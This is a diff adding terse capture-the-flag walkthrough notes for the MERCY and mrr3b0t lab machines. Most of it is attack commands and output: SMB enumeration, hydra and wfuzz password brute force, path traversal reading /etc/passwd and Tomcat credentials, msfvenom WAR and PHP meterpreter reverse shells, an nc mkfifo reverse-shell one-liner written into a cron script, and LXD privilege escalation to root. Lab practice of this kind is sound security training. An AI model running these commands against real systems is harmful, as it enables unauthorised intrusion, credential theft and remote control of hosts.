@@ -583,4 +583,244 @@ dc387b4cf1a4143f562dd1bdb3790ff1
 DONE !
 ##################################################################################################################################3##########
 
+MERCY
+LEVEL INTERMEDIATE
+
+1 - nmap -sS -sC -sV -p- 192.168.43.250
+
+2 - 
+ 
+ - ls -l /usr/share/nmap/scripts/smb*
+ 
+ - nmap -v -p 139,445 --script=smb-enum-users.nse 192.168.43.250
+
+| smb-enum-users: 
+|   MERCY\pleadformercy (RID: 1000)
+|     Full name:   QIU
+|     Description: 
+|     Flags:       Normal user account
+|   MERCY\qiu (RID: 1001)
+|     Full name:   
+|     Description: 
+|_    Flags:       Normal user account
+
+
+3 - hydra -l qiu -P /usr/share/wordlists/rockyou.txt 192.168.43.250 smb -t 1
+
+[445][smb] host: 192.168.43.250   login: qiu   password: password
+
+
+4 - smbclient \\\\192.168.43.250\\qiu -U qiu
+    - get config
+    - cat config
+
+---> Port knocking! That is why NMAP returned filtered for both port 80 and 22.
+
+[openHTTP]
+        sequence    = 159,27391,4
+        seq_timeout = 100
+        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
+        tcpflags    = syn
+
+I tried doing the port knocking sequence with NMAP but I couldn't get it to work.
+So I downloaded the knockd package which also contains a program to send knock sequences.
+
+└─# apt-get install knockd 
+
+
+ - knock -v 192.168.43.250 159:tcp 27391:tcp 4:tcp
+
+ -  nmap -sC -sV -p 80 192.168.43.250
+
+ -  curl 192.168.43.250/mercy/
+
+
+5 - curl 192.168.43.250/nomercy/
+RIPS is a popular static code analysis tool to automatically detect vulnerabilities in PHP applications.
+
+ - cat /usr/share/exploitdb/exploits/php/webapps/18660.txt 
+ 
+
+6 - 
+ - http://192.168.43.250/nomercy/windows/code.php?file=../../../../../../etc/passwd
+
+ - http://192.168.43.250/nomercy/windows/code.php?file=../../../../../../etc/tomcat7/tomcat-users.xml 
+
+
+	<? <role rolename="admin-gui"/>
+	<? <role rolename="manager-gui"/>
+	<? <user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/>
+	<? <user username="fluffy" password="freakishfluffybunny" roles="none"/> 
+
+
+ - dirb http://192.168.43.250:8080/manager/
+
++ http://192.168.43.250:8080/manager/html (CODE:401|SIZE:2474)                                                                                                                               
+
+ 
+ - login in it with username="thisisasuperduperlonguser" password="heartbreakisinevitable" 
+
+
+
+7 - msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.110 LPORT=8081 -f war -o reverse_shell.war
+
+
+8 - curl http://192.168.43.250:8080/reverse_shell/
+
+  - nc -lvnp 8081
+  
+  - python3 -c 'import pty;pty.spawn("/bin/sh")'
+
+base on:
+	<? <user username="fluffy" password="freakishfluffybunny" roles="none"/> 
+
+9 - 
+$ su fluffy
+Password: freakishfluffybunny
+
+10 - echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.110 9001 >/tmp/f" >> timeclock
+
+
+#######################################################################################################################################################
+
+
+mrr3b0t (192.168.43.180)
+
+LEVEL EASY
+
+
+1 - nmap -sS -T4 -Pn -A 192.168.43.180
+
+2 - dirb http://192.168.43.180  /usr/share/dirb/wordlists/big.txt -r 
+==> DIRECTORY: http://192.168.43.180/administrator/                                                                                                                                          
+==> DIRECTORY: http://192.168.43.180/images/                                                                                                                                                 
+
+3 -  
+
+ -  wget http://192.168.43.180/images/hidden.png
+
+ - upload that image in https://stylesuxx.github.io/steganography/
+
+ - Did you find the message? Take the Mrrobot user and break your password, just don't think too much! ------> USER: Mrrobot
+
+4 - bruteforce on login page:
+
+└─# wfuzz -c -w /usr/share/wordlists/wfuzz/general/common.txt -d "username=mrrobot&pass=FUZZ" --hc 200 http://192.168.43.180/administrator/index.php
+
+5 - msfvenom -p  php/meterpreter/reverse_tcp LHOST=192.168.43.214 LPORT=445 -f raw > shell.php
+
+The image format must be jpg,jpeg,gif,png 
+
+  - mv shell.php shell.png.php 
+  
+  - msfconsole .---> handler
+
+  - curl -v http://192.168.43.180/administrator/shell.png.php
+
+meterpreter > sysinfo
+Computer    : mrr3b0t
+OS          : Linux mrr3b0t 4.10.0-19-generic #21-Ubuntu SMP Thu Apr 6 17:04:57 UTC 2017 x86_64
+Meterpreter : php/linux
+meterpreter > getuid
+Server username: www-data (33)
+meterpreter > shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+6 -  cd ~
+www-data@mrr3b0t:/var/www/bf$ cd bf
+www-data@mrr3b0t:/var/www/bf$ strings buffer
+Password@123
+
+www-data@mrr3b0t:/var/www/bf$ cat /etc/passwd
+
+exploiter:x:1000:1000:exploiter,,,:/home/exploiter:/bin/bash
+
+www-data@mrr3b0t:/var/www$ su exploiter
+su exploiter
+Password: Password@123
+
+exploiter@mrr3b0t:/var/www$
+exploiter@mrr3b0t:/var/www$ id
+uid=1000(exploiter) gid=1000(exploiter) groups=1000(exploiter),24(cdrom),30(dip),46(plugdev),111(lxd),118(lpadmin),119(sambashare)
+
+root@kali: git clone https://github.com/saghul/lxd-alpine-builder.git
+
+root@kali: cd lxd-alpine-builder
+
+root@kali: ./build-alpine
+
+
+exploiter@mrr3b0t:/var/www$ lxc image import ./alpine-v3.12-x86_64–20200924_1041.tar.gz — alias myimage
+
+
+exploiter@mrr3b0t:/var/www$ lxc image list
+
+exploiter@mrr3b0t:/var/www$ lxd init
+
+
+exploiter@mrr3b0t:/var/www$ lxc init myimage ignite -c security.privileged=true
+
+
+exploiter@mrr3b0t:/var/www$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+
+exploiter@mrr3b0t:/var/www$ lxc start ignite
+
+exploiter@mrr3b0t:/var/www$ lxc exec ignite /bin/sh
+ 
+exploiter@mrr3b0t:/var/www$ id
+
+exploiter@mrr3b0t:/var/www$  cd /mnt/root/root/ && cat flag.txt.txt
+
+cat flag.txt.txt
+                 uuuuuuu
+             uu$$$$$$$$$$$uu
+          uu$$$$$$$$$$$$$$$$$uu
+         u$$$$$$$$$$$$$$$$$$$$$u
+        u$$$$$$$$$$$$$$$$$$$$$$$u
+       u$$$$$$$$$$$$$$$$$$$$$$$$$u
+       u$$$$$$$$$$$$$$$$$$$$$$$$$u
+       u$$$$$$"   "$$$"   "$$$$$$u
+       "$$$$"      u$u       $$$$"
+        $$$u       u$u       u$$$
+        $$$u      u$$$u      u$$$
+         "$$$$uu$$$   $$$uu$$$$"
+          "$$$$$$$"   "$$$$$$$"
+            u$$$$$$$u$$$$$$$u
+             u$"$"$"$"$"$"$u
+  uuu        $$u$ $ $ $ $u$$       uuu
+ u$$$$        $$$$$u$u$u$$$       u$$$$
+  $$$$$uu      "$$$$$$$$$"     uu$$$$$$
+u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
+$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
+ """      ""$$$$$$$$$$$uu ""$"""
+           uuuu ""$$$$$$$$$$uuu
+  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
+  $$$$$$$$$$""""           ""$$$$$$$$$$$"
+   "$$$$$"                      ""$$$$""
+     $$$"                         $$$$"
+
+FLAG{3LEV4T0R_P3NT3ST}
+#############################################################################################################################################################
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
